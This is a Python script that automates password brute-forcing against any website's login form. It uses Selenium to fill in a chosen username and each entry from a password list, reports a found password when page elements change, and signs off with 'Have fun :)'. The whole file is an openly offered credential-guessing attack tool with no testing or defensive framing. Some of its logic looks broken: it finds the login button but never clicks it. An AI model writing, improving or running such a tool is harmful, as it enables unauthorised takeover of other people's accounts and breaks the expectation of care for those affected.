# Coded by METACHAR
# Looking to work with other hit me up on my email @metachar1@gmail.com <--
import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException

from cosmetic import banner, color



#Config#
parser = OptionParser()
now = datetime.datetime.now()


#Args
parser.add_option("-u", "--username", dest="username",help="Choose the username")
parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_option("--website", dest="website",help="choose a website")
(options, args) = parser.parse_args()




def wizard():
    print (banner)
    website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
    print(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists ', flush=True),
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print(color.GREEN + '[OK]'+color.CWHITE, flush=True)
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print(color.RED + '[!]'+color.CWHITE+ 'User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print(color.RED + '[X]'+color.CWHITE)
        t.sleep(1)
        print(color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')
        exit()

    username_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
    password_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
    login_btn_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
    username = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
    pass_list = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
    brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)

def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
    f = open(pass_list, 'r')
    driver = webdriver.Chrome()
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    browser = webdriver.Chrome(chrome_options=optionss)
    while True:
        try:
            for line in f:
                browser.get(website)
                t.sleep(2)
                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
                # browser.find_element_by_css_selector(password_selector).clear()
                # browser.find_element_by_css_selector(username_selector).clear()
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                print('------------------------')
                print(color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                print('------------------------')
        except KeyboardInterrupt: #returns to main menu if ctrl C is used
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
            print('LAST PASS ATTEMPT BELLOW')
            print(color.GREEN + 'Password has been found: {0}'.format(line))
            print(color.YELLOW + 'Have fun :)')
            exit()



if options.username == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        wizard()


username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
print(banner)
brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)



